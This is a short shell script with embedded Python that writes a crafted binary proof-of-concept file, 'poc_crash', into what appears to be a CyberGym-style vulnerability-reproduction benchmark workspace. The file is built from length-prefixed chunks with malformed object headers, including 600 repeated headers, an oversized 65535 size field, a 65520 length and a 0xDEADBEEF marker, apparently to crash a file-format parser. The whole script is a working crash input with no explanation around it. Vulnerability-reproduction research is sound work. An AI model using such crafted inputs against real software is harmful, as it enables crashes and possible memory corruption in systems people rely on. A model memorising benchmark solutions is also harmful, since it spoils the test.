set -eu
python3 - <<'PY'
import struct
from pathlib import Path

A = 0x01020304
B = 0x05060708

def chunk(payload):
    return struct.pack('<H', len(payload)) + payload

def header(object_id, size):
    return struct.pack('>II', object_id, size) + b'\0' * 6 + b'\x90\x00'

body = (
    b'\x00'
    + struct.pack('>I', A)
    + struct.pack('>H', 65520)
    + struct.pack('>I', 0xDEADBEEF)
    + b'\0\0'
)
parts = [
    b'\x3b\x00',
    b'\x90\x00',
    b'\x6d\x00',
    b'\0' * 4 + b'\x90\x00',
    b'\x90\x00',
    *([header(A, 13)] * 600),
    header(B, 65535),
    b'\x9c\x12',
    b'\x90\x00',
    b'\x9f\x7f\x2a' + b'\0' * 42 + b'\x90\x00',
    b'\x6d\x00',
    b'\x6d\x00',
    b'\x6d\x00',
    body + b'\x90\x00',
]
output = Path('/CybinGym_workdir/poc_crash')
output.write_bytes(b''.join(chunk(part) for part in parts))
print(f'{output}: {output.stat().st_size} bytes')
PY
file /CybinGym_workdir/poc_crash
sha256sum /CybinGym_workdir/poc_crash
ls -la /CybinGym_workdir
